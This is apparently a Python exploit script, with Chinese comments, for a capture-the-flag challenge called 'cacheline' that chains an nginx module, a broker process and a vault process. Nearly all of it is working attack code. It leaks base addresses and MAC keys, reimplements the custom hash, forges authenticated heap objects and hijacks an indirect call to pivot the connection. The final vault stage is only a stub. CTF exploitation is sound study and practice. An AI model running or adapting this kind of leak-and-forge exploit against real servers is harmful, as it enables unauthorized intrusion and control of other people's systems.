#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cacheline (羊城杯 2026) exploit
=============================

三个协作进程构成一条"逐层放行"的协议链：

  client --HTTP--> nginx(worker, 加载 cacheline.so)
                        |  (unix socket /run/cacheline-broker.sock)
                        v
                    cachebroker (uid 1001)
                        |  (unix socket /run/cacheline-vault.sock)
                        v
                    cachevault  (uid 1002, 持有 /home/vault/flag -> fd 7)

每一层内部都维护一张"交叉认证的延迟对象图"：对象在创建时被写入
    cookie = KEY ^ object_address          ("按地址绑定"的凭证)
    mac    = H(key1, key2, object_fields)  (覆盖对象自身字段的完整性标签)
只有把配对对象互相绑定、互相认证通过，才会返回一个 8 字节"令牌"，
而令牌本身就是该层下一个秘密的泄漏（层 0 泄漏模块基址与两个 key，
层 1 泄漏 broker PIE 基址与 K1/K2）。拿到 key 之后我们就可以自己
计算 cookie 与 mac，用 import 类命令把伪造的对象写进堆里，从而
构造出满足最终认证的对象图，触发最后的间接调用把连接移交给下一层。

本脚本完整实现了层 0（nginx 模块）与层 1（broker），并实现了层 2
（vault）的帧协议客户端框架。
"""
import socket, struct, sys, time

M64 = (1 << 64) - 1


# ----------------------------------------------------------------------------
# 三个二进制共用的哈希函数（broker 的 0x2260 / cacheline.so 的 0x115b /
# vault 的 0x1410 是同一套结构：splitmix64 finalizer + 逐块轮转累加）
# ----------------------------------------------------------------------------
def F(x):
    x &= M64
    x ^= x >> 30
    x = (x * 0xbf58476d1ce4e5b9) & M64
    x ^= x >> 27
    x = (x * 0x94d049bb133111eb) & M64
    x ^= x >> 31
    return x


def rol(x, r):
    r &= 63
    if r == 0:
        return x & M64
    return ((x << r) | (x >> (64 - r))) & M64


def H(k1, k2, data, n=None):
    """H(k1, k2, data[0..n))  —— 与二进制中的实现逐指令对应"""
    if n is None:
        n = len(data)
    h = F(k1 ^ n ^ 0x9e3779b97f4a7c15)
    kk = k2
    for i in range(n):
        t = F((kk + data[i]) & M64)
        h = ((k1 ^ ((i * 0x6a09e667f3bcc909) & M64)) + rol(t ^ h, 0x11 + 0xb * i)) & M64
        kk = (kk + 0x517cc1b727220a95) & M64
    return F(k2 ^ h ^ 0xa54ff53a5f1d36f1)


def q(data, off):
    return struct.unpack_from("<Q", data, off)[0]


def put(data, off, v):
    struct.pack_into("<Q", data, off, v & M64)


# ----------------------------------------------------------------------------
# 极简 HTTP/1.1 keepalive 客户端（模块的状态机保存在 nginx worker 的 .so 里，
# 因此所有请求必须复用同一条 TCP 连接）
# ----------------------------------------------------------------------------
class Http:
    def __init__(self, host, port, timeout=10):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""

    def q(self, args):
        self.s.sendall(("GET /?" + args + " HTTP/1.1\r\nHost: x\r\n\r\n").encode())
        return self.read_resp()

    def read_resp(self):
        while b"\r\n\r\n" not in self.buf:
            d = self.s.recv(65536)
            if not d:
                raise EOFError("closed")
            self.buf += d
        head, rest = self.buf.split(b"\r\n\r\n", 1)
        self.buf = rest
        lines = head.split(b"\r\n")
        status = int(lines[0].split()[1])
        clen = None
        for l in lines[1:]:
            k, _, v = l.partition(b":")
            if k.strip().lower() == b"content-length":
                clen = int(v.strip())
        if clen is None:
            return status, b""
        while len(self.buf) < clen:
            d = self.s.recv(65536)
            if not d:
                raise EOFError("closed")
            self.buf += d
        body, self.buf = self.buf[:clen], self.buf[clen:]
        return status, body


# ----------------------------------------------------------------------------
# Layer 0: nginx 的 cacheline 模块
#   状态机（静态变量 level @ .so+0x6600）：
#     0 -op=create(0x300 hex)-> 1  CLTACKT4 对象（0x180）
#     1 -op=resize(0x300 hex)-> 2  需要 malloc 复用同一块内存，
#                                  且 [0x38]=="CLTACKT4"、[0x40]==0x491
#     2 -op=ledgeropen-------> 3   模块自己建 beacon(0x128) 与 ledger(0xf8)
#     3 -op=beacon----------->     泄漏 beacon: n=seed a= e= k=
#     3 -op=ledger----------->     泄漏 ledger: n=o=t=
#     3 -op=route(0x350 hex)-> 4  CLLROUT4(0x1a8)
#     4 -op=seal(0x1b0 hex)---> 5  CLLSEAL4(0xd8)
#     5 -op=grant(0x430 hex)--> 6  CLGRANT4(0x218)
#     6 -op=voucher(0x210 hex)->7  CVOUCHR4(0x108)
#     7 -op=commit-----------> 8  "activated"
#     8 -op=broker&data=<hex>     把 hex 解码后原样转发给 broker socket，
#                                 并把 broker 的回复作为 HTTP body 返回
#   关键：beacon 的 e/k 两个字段是 "已知数据的 MAC ^ 密钥"，
#   e = H(base+0x2199, seed, [seed, base+0x2199]) ^ K2
#   k = H(base+0x2199, seed, [K2,   seed])         ^ K1
#   而 a = rol(seed,0x11) ^ (base+0x2199) 直接泄漏模块基址。
# ----------------------------------------------------------------------------
TAG_TACK   = b"CLTACKT4"
TAG_ROUTE  = b"CLLROUT4"
TAG_SEAL   = b"CLLSEAL4"
TAG_GRANT  = b"CLGRANT4"
TAG_VOUCH  = b"CVOUCHR4"


class SoLayer:
    def __init__(self, http, verbose=True):
        self.h = http
        self.v = verbose
        self.mem = self.k1 = self.k2 = self.seed = self.conn = self.ledger30 = None

    def log(self, *a):
        if self.v:
            print("[so]", *a)

    def _tack(self):
        t = bytearray(0x180)
        t[0x38:0x40] = TAG_TACK
        put(t, 0x40, 0x491)
        return bytes(t)

    def stage1(self):
        st, body = self.h.q("op=create&data=" + self._tack().hex())
        if body.strip() != b"created":
            self.log("create failed", st, body[:40])
            return False
        # resize 需要空闲块被同尺寸重新分配：mallocng 的分组里不一定立刻返回
        # 刚释放的槽位，实测几次之内一定成功
        for i in range(16):
            st, body = self.h.q("op=resize&data=" + self._tack().hex())
            if body.strip() == b"staged":
                self.log("resize reuse after %d tries" % (i + 1))
                break
            if st != 200:
                self.log("resize error", st)
                return False
        else:
            return False
        st, body = self.h.q("op=ledgeropen")
        if body.strip() != b"opened":
            self.log("ledgeropen failed", st, body[:40])
            return False
        # beacon: 泄漏 seed / a / e / k
        st, body = self.h.q("op=beacon")
        f = dict(x.split("=", 1) for x in body.decode().split())
        seed, a, e, k = (int(f[x], 16) for x in ("n", "a", "e", "k"))
        mem = rol(seed, 0x11) ^ a            # = module_base + 0x2199
        k2 = e ^ H(mem, seed, [seed, mem], 2)
        k1 = k ^ H(mem, seed, [k2, seed], 2)
        # ledger: 用 K1/K2 反解出 nginx connection 指针
        st, body = self.h.q("op=ledger")
        f = dict(x.split("=", 1) for x in body.decode().split())
        l30, l40, l48 = (int(f[x], 16) for x in ("n", "o", "t"))
        assert l48 == H(k1, k2, [l40 ^ H(k1, k2, [l30, seed], 2), mem, seed, l30], 4)
        self.conn = l40 ^ H(k1, k2, [l30, seed], 2)
        self.mem, self.seed, self.k1, self.k2, self.ledger30 = mem, seed, k1, k2, l30
        self.log("module_base+0x2199=%#x K1=%#x K2=%#x conn=%#x" % (mem, k1, k2, self.conn))
        return True

    def stage2(self):
        k1, k2, mem, conn, seed, l30 = self.k1, self.k2, self.mem, self.conn, self.seed, self.ledger30
        route40, route68 = 0x1111111111111111, 0x2222222222222222
        # seal 的 MAC 只覆盖自身字段，可以离线算
        seal = bytearray(0xd8)
        seal[0x28:0x30] = TAG_SEAL
        put(seal, 0x30, route68); put(seal, 0x38, route40)
        put(seal, 0x40, seed);    put(seal, 0x48, l30)
        put(seal, 0x50, 0x3333333333333333); put(seal, 0x58, 1)
        put(seal, 0x60, H(k1 ^ 0x243f6a8885a308d3, k2,
                          [0x344c4145534c4c43, q(seal, 0x30), q(seal, 0x38), q(seal, 0x40),
                           q(seal, 0x48), q(seal, 0x50), 1], 7))
        # commit 要求 route[0x60]^seal[0x50]^grant[0x70]^voucher[0x60] == 1
        v60, g70 = 0x6666666666666666, 0
        route60 = 1 ^ q(seal, 0x50) ^ g70 ^ v60
        route = bytearray(0x1a8)
        route[0x38:0x40] = TAG_ROUTE
        put(route, 0x40, route40)
        put(route, 0x48, H(k1, k2, [route40, seed, l30], 3) ^ conn)   # 与 conn 绑定
        put(route, 0x50, seed); put(route, 0x58, l30)
        put(route, 0x60, route60); put(route, 0x68, route68); put(route, 0x70, 1)
        put(route, 0x78, H(k1, k2, [0x3454554f524c4c43, q(route, 0x40), q(route, 0x48),
                                    q(route, 0x50), q(route, 0x58), q(route, 0x60),
                                    q(route, 0x68), 1], 8))
        grant = bytearray(0x218)
        grant[0x38:0x40] = TAG_GRANT
        put(grant, 0x40, 0x4444444444444444)
        put(grant, 0x48, H(k1, k2, [q(grant, 0x40), route40, q(seal, 0x30)], 3) ^ conn)
        put(grant, 0x50, seed); put(grant, 0x58, l30)
        put(grant, 0x60, route40); put(grant, 0x68, q(seal, 0x30)); put(grant, 0x70, g70)
        put(grant, 0x78, 0x5555555555555555)
        put(grant, 0x80, H(k1 ^ k2, (k1 + k2) & M64,
                           [mem, conn, seed, l30, route40, q(seal, 0x30), route60,
                            q(seal, 0x50)], 8))
        put(grant, 0x88, 1)
        put(grant, 0x90, H(k1 ^ 0x13198a2e03707344, k2,
                           [0x34544e4152474c43, q(grant, 0x40), q(grant, 0x48), q(grant, 0x50),
                            q(grant, 0x58), q(grant, 0x60), q(grant, 0x68), q(grant, 0x70),
                            q(grant, 0x78), q(grant, 0x80), 1], 11))
        v = bytearray(0x108)
        v[0x28:0x30] = TAG_VOUCH
        put(v, 0x30, q(grant, 0x78)); put(v, 0x38, q(grant, 0x40))
        put(v, 0x40, route40); put(v, 0x48, q(seal, 0x30))
        put(v, 0x50, seed); put(v, 0x58, l30); put(v, 0x60, v60); put(v, 0x68, 1)
        put(v, 0x70, H(k1 ^ 0x3c6ef372fe94f82b, k2,
                       [0x34524843554f5643, q(v, 0x30), q(v, 0x38), q(v, 0x40), q(v, 0x48),
                        q(v, 0x50), q(v, 0x58), q(v, 0x60), 1], 9))
        for name, obj, exp in (("route", route, b"routed"), ("seal", seal, b"sealed"),
                               ("grant", grant, b"granted"), ("voucher", v, b"vouched")):
            st, body = self.h.q("op=%s&data=%s" % (name, bytes(obj).hex()))
            if body.strip() != exp:
                self.log(name, "rejected:", body[:40])
                return False
        st, body = self.h.q("op=commit")
        if body.strip() != b"activated":
            self.log("commit rejected", body[:40])
            return False
        self.log("module gate opened (level=8)")
        return True

    def relay(self, payload):
        """把 payload 交给 broker（模块自动加 2 字节大端长度前缀）"""
        return self.h.q("op=broker&data=" + payload.hex())


# ----------------------------------------------------------------------------
# Layer 1: cachebroker
#   对象表（.bss）：
#     0x7420 探针 CLPROBE4(0x90)     0x73e0 链接表   0x73a0 import 标记
#     0x7360 孔径 CLAPERT4(0xc0)     0x7320 链接表   0x72e0 import 标记
#     0x71e0 分片 CLSHARD4(0xf0)     0x71a0          0x7160
#     0x7120 印记 CLSTAMP4(0x130)    0x70e0          0x70a0
#     0x72c0 许可 CPERMIT4(0x160)    0x72a0          0x7280
#     0x7260 授权 MANDATE4(0xb0)     0x7240          0x7220
#   'V' 对 (探针,孔径) 做完整交叉认证后返回 8 字节令牌：
#     type0 -> [0x7008] = base+0x4000（结束函数 lea 出来的 PIE 地址，泄漏基址）
#     type1 -> K1       type2 -> K2
#   拿到 K1/K2 后：K0 = H(K1,K2,{base+0x4000, "321YKRO"}, 2)，
#   于是所有 MAC 都可自算，用 A/a/F/f/K/Y 把伪造对象写进堆，
#   'C' 的最终校验通过后执行 call rax（rdi=fd），把 rax 指向
#   base+0x4000（连 vault 的 proxy），连接被移交给 vault。
# ----------------------------------------------------------------------------
TAG_PROBE  = b"CLPROBE4"
TAG_APERT  = b"CLAPERT4"
TAG_PERMIT = b"CPERMIT4"
TAG_MAND   = b"MANDATE4"
TAG_SHARD  = b"CLSHARD4"
TAG_STAMP  = b"CLSTAMP4"


class Broker:
    def __init__(self, relay, verbose=True):
        self.relay = relay
        self.v = verbose
        self.K1 = self.K2 = self.base = self.K0 = None

    def log(self, *a):
        if self.v:
            print("[broker]", *a)

    def send(self, payload, expect=None):
        st, body = self.relay(payload)
        if expect is not None and expect not in body:
            self.log("unexpected reply for", payload[:2], st, body[:40])
        return body

    # ---- 泄漏阶段：构造三对 (探针, 孔径)，类型 0/1/2 各一对 ----
    def leaks(self):
        toks = {}
        for t in range(3):
            ps = asp = lk = 2 * t
            al = 2 * t + 1
            self.send(b"N" + bytes([ps, t]), b"PROBE")
            self.send(b"L" + bytes([ps, lk]), b"LINKED")
            body = self.send(b"P" + bytes([lk]))           # 泄漏探针 0x40 字节
            cookie_p = q(body, 0x18)
            pb = bytearray(0x90)
            pb[0:8] = TAG_PROBE
            put(pb, 8, t); put(pb, 0x10, 0x100 + t); put(pb, 0x18, cookie_p); put(pb, 0x30, 1)
            self.send(b"A" + bytes([lk]) + bytes(pb), b"IMPORTED")
            self.send(b"n" + bytes([asp, t]), b"APERTURE")
            self.send(b"l" + bytes([asp, al]), b"LINKED")
            body = self.send(b"p" + bytes([al]))
            cookie_a = q(body, 0x18)
            ab = bytearray(0xc0)
            ab[0:8] = TAG_APERT
            put(ab, 8, t); put(ab, 0x10, 0x200 + t); put(ab, 0x18, cookie_a); put(ab, 0x30, 1)
            self.send(b"a" + bytes([al]) + bytes(ab), b"IMPORTED")
            self.send(b"B" + bytes([ps, asp]), b"BOUND")   # 重新绑定并重算 MAC
            body = self.send(b"V" + bytes([lk, al]))
            if len(body) != 8:
                self.log("V failed, type", t, body)
                return False
            toks[t] = struct.unpack("<Q", body)[0]
        self.base = toks[0] - 0x4000
        self.K1, self.K2 = toks[1], toks[2]
        self.K0 = H(self.K1, self.K2, [self.base + 0x4000, 0x4f524b4559313233], 2)
        self.log("base=%#x K1=%#x K2=%#x K0=%#x" % (self.base, self.K1, self.K2, self.K0))
        return True

    # ---- 伪造阶段 ----
    def run(self):
        K1, K2, K0, base = self.K1, self.K2, self.K0, self.base
        # 许可 / 授权：先创建再泄漏地址（K1^ptr）
        self.send(b"G" + bytes([0]), b"PERMIT")
        self.send(b"H" + bytes([0, 0]), b"HELD")
        permit_ptr = q(self.send(b"I" + bytes([0])), 0x10) ^ K1
        self.send(b"M" + bytes([0]), b"MANDATE")
        self.send(b"O" + bytes([0, 0]), b"HELD")
        mand_ptr = q(self.send(b"Q" + bytes([0])), 0x10) ^ K1
        self.log("permit=%#x mandate=%#x" % (permit_ptr, mand_ptr))
        # 分片 / 印记
        shp, stp = [], []
        for i in range(4):
            self.send(b"S" + bytes([i, i]), b"SHARD")
            self.send(b"T" + bytes([i, i]), b"TETHERED")
            shp.append(q(self.send(b"U" + bytes([i])), 0x18) ^ K1)
            self.send(b"s" + bytes([i, i]), b"STAMP")
            self.send(b"t" + bytes([i, i]), b"TETHERED")
            stp.append(q(self.send(b"u" + bytes([i])), 0x18) ^ K1)
        fsh, fst = [], []
        for i in range(4):
            sh, sp = bytearray(0xf0), bytearray(0x130)
            sseed, tseed = 0x1000 + i, 0x2000 + i
            payload = bytes([0x40 + i]) * 0xa8
            sh[0x48:0xf0] = payload
            # 分片自带的"链式摘要"：H(K0, seed, [i]) 然后逐 8 字节滚动
            ch = H(K0, sseed, [i], 1)
            for j in range(21):
                ch = H(K0 ^ sseed, K1, [ch, struct.unpack_from("<Q", payload, 8 * j)[0], 8 * j], 3)
            sh[0:8] = TAG_SHARD
            put(sh, 8, i); put(sh, 0x10, sseed); put(sh, 0x18, K1 ^ shp[i])
            put(sh, 0x20, K1 ^ stp[i]); put(sh, 0x28, tseed); put(sh, 0x30, ch); put(sh, 0x38, 1)
            put(sh, 0x40, H(K1, K0, [q(sh, k) for k in range(0, 0x40, 8)], 8))
            sp[0:8] = TAG_STAMP
            put(sp, 8, i); put(sp, 0x10, tseed); put(sp, 0x18, K1 ^ stp[i])
            put(sp, 0x20, K1 ^ shp[i]); put(sp, 0x28, sseed); put(sp, 0x30, ch); put(sp, 0x38, 1)
            put(sp, 0x40, H(K1 ^ 0x3c6ef372fe94f82b, K0,
                            [q(sp, k) for k in range(0, 0x40, 8)], 8))
            fsh.append(sh)
            fst.append(sp)
        for i in range(4):
            self.send(b"F" + bytes([i]) + bytes(fsh[i]), b"IMPORTED")
            self.send(b"f" + bytes([i]) + bytes(fst[i]), b"IMPORTED")
        # 许可里的四个 pairing 链式摘要
        h4 = K0
        for i in range(4):
            h4 = H(K0 ^ i, K1, [h4, q(fsh[i], 0x30), q(fsh[i], 0x10),
                                q(fst[i], 0x10), shp[i], stp[i]], 6)
        permit = bytearray(0x160)
        permit[0:8] = TAG_PERMIT
        put(permit, 8, 0); put(permit, 0x10, K1 ^ permit_ptr)
        put(permit, 0x18, K1 ^ mand_ptr); put(permit, 0x20, 0)
        put(permit, 0x28, h4); put(permit, 0x30, 1)
        put(permit, 0x38, H(K2, K1, [q(permit, k) for k in range(0, 0x38, 8)], 7))
        mand = bytearray(0xb0)
        mand[0:8] = TAG_MAND
        put(mand, 8, 0); put(mand, 0x10, K1 ^ mand_ptr); put(mand, 0x18, K1 ^ permit_ptr)
        put(mand, 0x20, 0)
        # 把最终的 call rax 目标写成 base+0x4000
        put(mand, 0x28, rol(q(permit, 8) ^ mand_ptr ^ K2 ^ (base + 0x4000), 0x13))
        put(mand, 0x30, H(K2 ^ K1, K0, [h4, permit_ptr, mand_ptr, q(permit, 8), q(mand, 8)], 5))
        put(mand, 0x38, 1)
        put(mand, 0x40, H(K2 ^ 0x13198a2e03707344, K1,
                          [q(mand, k) for k in range(0, 0x40, 8)], 8))
        self.send(b"K" + bytes([0]) + bytes(permit), b"IMPORTED")
        self.send(b"Y" + bytes([0]) + bytes(mand), b"IMPORTED")
        # 'C'：11 字节 —— 这也正是 nginx 模块检查 n==0xb 的那条消息
        cmd = b"C" + bytes([0, 0]) + bytes([0, 0, 1, 1, 2, 2, 3, 3])
        st, body = self.relay(cmd)
        self.log("C ->", st, body)
        return body


# ----------------------------------------------------------------------------
# Layer 2: cachevault
#   握手（由 broker 的 proxy 完成）：写入 16 字节
#       "CLV4/VAULT\n" + 5 字节固定尾巴
#   之后每个请求是 16 字节头 + payload：
#       "CLV4" | op | a | b | 0 | length(le32) | seq(le32，必须递增)
#   应答是 "CLR4" | code | a | b | 0 | 8 字节长度域 | payload
#   对象/表（.bss）：VALCRED 0xb0@0x7420, CTICKET 0x150@0x74a0,
#   CLCHUNK 0x140@0x71e0, CLVSEAL 0x98@0x7120, VMTOKEN 0xa0@0x7660,
#   VMRECPT 0xd0@0x75a0；上下文对象 @0x76a0 里保存 4 个由
#   seed(=getrandom) 派生的密钥 ctx[0xd8..0xf0]。
#   opcode 表：1..13（创建/链接/import/泄漏/释放/配对），
#   0x10..0x40（其他类型），其中 0x40 是最终 "commit"：
#   校验 4 组配对 + 链式摘要后执行 call rax，
#   rax = [obj3+8] ^ obj4 ^ ctx[0xe0] ^ ror([obj4+0x28],0x15)，
#   由 op 0x2c 的绑定把该式化简成 base+0x17f0（一个空操作函数）。
# ----------------------------------------------------------------------------
class Vault:
    def __init__(self, relay, verbose=True):
        self.relay = relay
        self.v = verbose
        self.seq = 0
        self.greeting = None

    def cmd(self, op, a=0, b=0, payload=b""):
        self.seq += 1
        hdr = b"CLV4" + bytes([op, a, b, 0]) + struct.pack("<I", len(payload)) + \
              struct.pack("<I", self.seq)
        st, body = self.relay(hdr + payload)
        if self.v:
            print("[vault] op=%#x -> %r" % (op, body[:32]))
        return body

    def handshake(self, greeting):
        self.greeting = greeting
        return greeting[:4] == b"CLR4"


# ----------------------------------------------------------------------------
def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 19999
    http = Http(host, port)
    so = SoLayer(http)
    if not so.stage1():
        print("[-] nginx module: key leak failed")
        return 1
    if not so.stage2():
        print("[-] nginx module: forged chain rejected")
        return 1
    br = Broker(so.relay)
    if not br.leaks():
        print("[-] broker: token leak failed")
        return 1
    greet = br.run()
    if not greet or greet[:4] != b"CLR4":
        print("[-] broker: commit/pivot failed:", greet)
        return 1
    print("[+] pivot to vault, greeting =", greet)
    va = Vault(so.relay)
    va.handshake(greet)
    # 到这里连接已经由 broker 的 proxy 转交给 vault，
    # 每次 op=broker 的请求就是一帧 vault 协议。
    va.cmd(0x15, 0, 0)          # create VALCRED
    return 0


if __name__ == "__main__":
    sys.exit(main())
